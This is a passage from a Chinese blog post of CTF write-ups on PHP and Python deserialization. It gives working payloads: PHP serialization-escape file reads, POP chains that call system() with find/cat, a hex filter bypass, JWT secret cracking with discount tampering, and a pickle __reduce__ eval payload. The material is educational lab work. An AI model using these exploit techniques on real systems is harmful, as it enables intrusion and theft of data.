extract($_POST);

if(!$function)&#123;
    echo &#39;&lt;a href&#x3D;&quot;..&#x2F;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;
&#125;

if(!$_GET[&#39;img_path&#39;])&#123;
    $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);
&#125;else&#123;
    $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));
&#125;

$serialize_info &#x3D; filter(serialize($_SESSION));

if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;
    highlight_file(&#39;index.php&#39;);
&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;
    eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!
&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;
    $userinfo &#x3D; unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
&#125;</code></pre>

<p>在令<code>$function == &#39;phpinfo&#39;</code>时查看<code>phpinfo()</code>内容发现存在<code>d0g3_f1ag.php</code> 文件，推测flag在其中，于是想办法构造文件读取方法</p>
<p>不难看到代码中有一个<code>extract()</code>函数，这个函数如果没设置<code>extract_rules</code>为<code>EXTR_SKIP</code> 则会覆盖原有变量</p>
<ul>
<li><strong>extract()</strong>： 函数从数组中将变量导入到当前的符号表。<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.extract.php">参考</a></li>
</ul>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200515135141013.png" alt loading="lazy"></p>
<p>那么我们如果想要读取<code>d0g3_f1ag.php</code>文件的内容就需要令反序列化后的<code>$_SESSION[&#39;img&#39;]</code>为<code>d0g3_f1ag.php  =&gt;  ZDBnM19mMWFnLnBocA==</code>则初步反序列化内容<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>再看到<code>$serialize_info = filter(serialize($_SESSION));</code>，先经过序列化，然后在进行<code>filter</code>函数，也就是过滤替换操作，这样的话就很有可能会造成序列化字符串逃逸的问题，于是构造利用payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">_SESSION[user]&#x3D;flagflagflagflagphpphp&amp;_SESSION[function]&#x3D;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:1:&quot;f&quot;;s:1:&quot;a&quot;;&#125;</code></pre>

<p>由于<code>_SESSION</code>数组有3个值，则需要在后面补充随便一个值即可</p>
<p>传入后<code>$serialize_info</code>的就为以下值</p>
<pre class="language-php" data-language="php"><code class="language-php">a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:34:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; &quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;</code></pre>

<p><code>user</code>闭合<code>&quot;;s:8:&quot;function&quot;;s:34:</code>，随后再读取<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>，随后大括号闭合，后面的<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>值丢弃</p>
<p>读取到<code>d0g3_f1ag.php</code> 内容为</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
$flag &#x3D; &#39;flag in &#x2F;d0g3_fllllllag&#39;;
?&gt;</code></pre>

<p>再依法读取<code>/d0g3_fllllllag</code>即可</p>
<pre class="language-php" data-language="php"><code class="language-php">_SESSION[user]&#x3D;flagflagflagflagphpphp&amp;_SESSION[function]&#x3D;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;f&quot;;s:1:&quot;a&quot;;&#125;</code></pre>

<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>题目每隔一段时间都会自动发一个包刷新一下网页，抓包下来看看发来了啥数据</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625154555825.png" alt loading="lazy"></p>
<p>测试后报错得到函数调用了<code>call_user_func()</code>函数，该函数把第一个参数作为回调函数调用，也就是说这个数据包调用了date函数，传入了后面为p的参数，并且执行了函数输出了结果</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155114637.png" alt loading="lazy"></p>
<p>于是用<code>system</code>函数测试命令执行</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155200767.png" alt loading="lazy"></p>
<p>被过滤了，于是直接将<code>index.php</code>的源码读取出来(读根目录没有flag)，<code>func=readfile&amp;p=index.php</code>，得到源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
function gettime($func, $p) &#123;
    $result &#x3D; call_user_func($func, $p);
    $a&#x3D; gettype($result);
    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;
        return $result;
    &#125; else &#123;return &quot;&quot;;&#125;
&#125;
class Test &#123;
    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;
    var $func &#x3D; &quot;date&quot;;
    function __destruct() &#123;
        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;
            echo gettime($this-&gt;func, $this-&gt;p);
        &#125;
    &#125;
&#125;
$func &#x3D; $_REQUEST[&quot;func&quot;];
$p &#x3D; $_REQUEST[&quot;p&quot;];

if ($func !&#x3D; null) &#123;
    $func &#x3D; strtolower($func);
    if (!in_array($func,$disable_fun)) &#123;
        echo gettime($func, $p);
    &#125;else &#123;
        die(&quot;Hacker...&quot;);
    &#125;
&#125;
?&gt;</code></pre>

<p>果不其然过滤了很多命令执行的函数，用的<code>in_array</code>函数进行对比，但是可以看到改函数的<code>Test</code>方法，里面也调用了<code>gettime</code>方法，于是构造反序列化利用</p>
<p>exp：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
class Test &#123;
    public $p &#x3D; &quot;find &#x2F; -name *flag*&quot;;
    public $func &#x3D; &quot;system&quot;;
&#125;
$b &#x3D; new Test();
echo serialize($b);


O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:19:&quot;find &#x2F; -name *flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre>

<p>传入找到flag所在的文件</p>
<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155712200.png" alt loading="lazy"></p>
<p>尝试读取</p>
<pre class="language-php" data-language="php"><code class="language-php">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre>

<p>得到flag</p>
<h3 id="2020-第四届-强网杯-web辅助"><a href="#2020-第四届-强网杯-web辅助" class="headerlink" title="[2020 第四届 强网杯]-web辅助"></a>[2020 第四届 强网杯]-web辅助</h3><p>题目给出了源码，挑重点看：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
class player&#123;
    protected $user;
    protected $pass;
    protected $admin;

    public function __construct($user, $pass, $admin &#x3D; 0)&#123;
        $this-&gt;user &#x3D; $user;
        $this-&gt;pass &#x3D; $pass;
        $this-&gt;admin &#x3D; $admin;
    &#125;

    public function get_admin()&#123;
        return $this-&gt;admin;
    &#125;
&#125;

class topsolo&#123;
    protected $name;

    public function __construct($name &#x3D; &#39;Riven&#39;)&#123;
        $this-&gt;name &#x3D; $name;
    &#125;

    public function TP()&#123;
        if (gettype($this-&gt;name) &#x3D;&#x3D;&#x3D; &quot;function&quot; or gettype($this-&gt;name) &#x3D;&#x3D;&#x3D; &quot;object&quot;)&#123;
            $name &#x3D; $this-&gt;name;
            $name();
        &#125;
    &#125;

    public function __destruct()&#123;
        $this-&gt;TP();
    &#125;

&#125;

class midsolo&#123;
    protected $name;

    public function __construct($name &#x3D; &#39;Yasuo&#39;)&#123;
        $this-&gt;name &#x3D; $name;
    &#125;
    public function __wakeup()&#123;
        if ($this-&gt;name !&#x3D;&#x3D; &#39;Yasuo&#39;)&#123;
            $this-&gt;name &#x3D; &#39;Yasuo&#39;;
            echo &quot;No Yasuo! No Soul!\n&quot;;
        &#125;
    &#125;
    

    public function __invoke()&#123;
        $this-&gt;Gank();
    &#125;

    public function Gank()&#123;
        if (stristr($this-&gt;name, &#39;Yasuo&#39;))&#123;
            echo &quot;Are you orphan?\n&quot;;
        &#125;
        else&#123;
            echo &quot;Must Be Yasuo!\n&quot;;
        &#125;
    &#125;
&#125;

class jungle&#123;
    protected $name &#x3D; &quot;&quot;;

    public function __construct($name &#x3D; &quot;Lee Sin&quot;)&#123;
        $this-&gt;name &#x3D; $name;
    &#125;

    public function KS()&#123;
        system(&quot;cat &#x2F;flag&quot;);
    &#125;

    public function __toString()&#123;
        $this-&gt;KS();  
        return &quot;&quot;;  
    &#125;

&#125;
&#x2F;&#x2F;topsolo-&gt;__destruct()-&gt;TP()-&gt;$name()-&gt;midsolo-&gt;__invoke()-&gt;Gank()-&gt;stristr($this-&gt;name, &#39;Yasuo&#39;)-&gt;jungle-&gt;__toString()-&gt;KS()
?&gt;</code></pre>

<p>题目给出了<code>cat /flag</code>的函数，于是我们只需要想办法触发该方法即可</p>
<p>分析反序列化链：</p>
<pre class="language-php" data-language="php"><code class="language-php">topsolo-&gt;__destruct()-&gt;TP()-&gt;$name()-&gt;midsolo-&gt;__invoke()-&gt;Gank()-&gt;stristr($this-&gt;name, &#39;Yasuo&#39;)-&gt;jungle-&gt;__toString()-&gt;KS()</code></pre>

<p>其中有几个需要绕过的点：</p>
<p><code>__wakeup</code>函数，老考点了，改变序列化后的对象属性即可</p>
<p>而在<code>common.php</code>中有个<code>check</code>函数需要绕过：</p>
<pre class="language-php" data-language="php"><code class="language-php">function check($data)
&#123;
    if(stristr($data, &#39;name&#39;)!&#x3D;&#x3D;False)&#123;
        die(&quot;Name Pass\n&quot;);
    &#125;
    else&#123;
        return $data;
    &#125;
&#125;</code></pre>

<ul>
<li>这里利用十六进制bypass属性名，即<code>name-&gt;\6e\61\6d\65</code></li>
</ul>
<p>于是构造payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">$a &#x3D; new jungle();
$b &#x3D; new midsolo();
$b-&gt;name &#x3D; $a;
$c &#x3D; new topsolo();
$c-&gt;name &#x3D; $b;
var_dump(serialize($c));

$user &#x3D; &#39;0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&#39;;
$pass &#x3D; &#39;0&quot;;s:7:&quot;\0*\0pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;\0*\0\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;\0*\0\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;\0*\0\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;&#125;;&#39;;</code></pre>

<p>传入即可<code>cat /flag</code></p>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="CISCN2019-华北赛区-Day1-Web2—ikun"><a href="#CISCN2019-华北赛区-Day1-Web2—ikun" class="headerlink" title="CISCN2019-华北赛区-Day1-Web2—ikun"></a>CISCN2019-华北赛区-Day1-Web2—ikun</h3><p>根据题目提示需要买到lv6的账号，于是写脚本找</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;4882ba34-0c83-48c1-b876-e1b21efa6a68.node3.buuoj.cn&#x2F;shop?page&#x3D;&#123;&#125;&quot;
for i in range(1000):
    a &#x3D; requests.get(url.format(i))
    if &quot;static&#x2F;img&#x2F;lv&#x2F;lv6.png&quot; in a.text:
        print(url.format(i))</code></pre>

<p>跑出lv6在<code>page=181</code>的页面，点击购买钱不够，发现有折扣，于是抓包改折扣为0.0000001，随后提示需要是<code>admin</code>，抓包注意到有一个<code>jwt</code>的<code>cookie</code>，<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/576dbf44b2ae">参考</a>，这里有一个编解码<a target="_blank" rel="noopener" href="https://jwt.io/#debugger-io">网站</a>，再找到爆破密钥脚本<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">网站</a>，跑出来密钥为<code>1kun</code>，放到编码网站编码后携带这个<code>jwt</code>的<code>cookie</code>发包，随后来到<code>b1g_m4mber</code>界面，查看源码得到<code>www.zip</code>源码包，找到关键利用的代码</p>
<pre class="language-python" data-language="python"><code class="language-python">import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user &#x3D;&#x3D; &quot;admin&quot;:
            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, member&#x3D;0)
        else:
            return self.render(&#39;no_ass.html&#39;)

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become &#x3D; self.get_argument(&#39;become&#39;)
            p &#x3D; pickle.loads(urllib.unquote(become))
            return self.render(&#39;form.html&#39;, res&#x3D;p, member&#x3D;1)
        except:
            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, member&#x3D;0)</code></pre>

<p>明显的pickle反序列化利用，POST的<code>become</code>为利用点，随后构造反序列化利用poc：</p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- coding: UTF-8 -*-
# 题目是在python2环境下，需要用python2跑
import pickle
import urllib

class dairy(object):
    def __reduce__(self):
        return eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,) &#x2F;&#x2F; eval直接读取文件

today &#x3D; dairy()
# print(pickle.dumps(today))
x &#x3D; pickle.dumps(today)
print(urllib.quote(x))
a &#x3D; pickle.loads(urllib.unquote(x))</code></pre>

<p>得到payload：</p>
<pre class="language-python" data-language="python"><code class="language-python">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code></pre>

<p>传入发包得到flag</p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/zfb.jpg"><img loading="lazy" src="/images/zfb.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qq.png"><img loading="lazy" src="/images/qq.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wx.png"><img loading="lazy" src="/images/wx.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Extrader</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://www.extrader.top/posts/d3333ead/" title="CTF-反序列化">https://www.extrader.top/posts/d3333ead/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/488d0f65/" rel="prev" title="Python反序列化漏洞浅析"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">Python反序列化漏洞浅析</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/ebf6eea3/" rel="next" title="初识Flask"><span class="post-nav-text">初识Flask</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>若您想及时得到回复提醒，建议跳转 GitHub Issues 评论。</span><br><span>若没有本文 Issue，您可以使用 Comment 模版新建。</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/Extrader-home/Extrader-home.github.io/issues?q=is:issue+CTF-反序列化">GitHub Issues</a></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"D0RsYpx00piDirHr8rmxtml4-gzGzoHsz","appKey":"aCk3nRmmI5uzkoEoVjtToEe8","placeholder":"不留点什么？","avatar":null,"pageSize":10,"visitor":false,"highlight":true,"recordIP":false,"enableQQ":true,"meta":["nick","mail","link"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/posts/d3333ead/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">湘ICP备2021001321号</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Extrader</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.3</span></div><div class="live_time"><span>本博客已运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-01-08T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>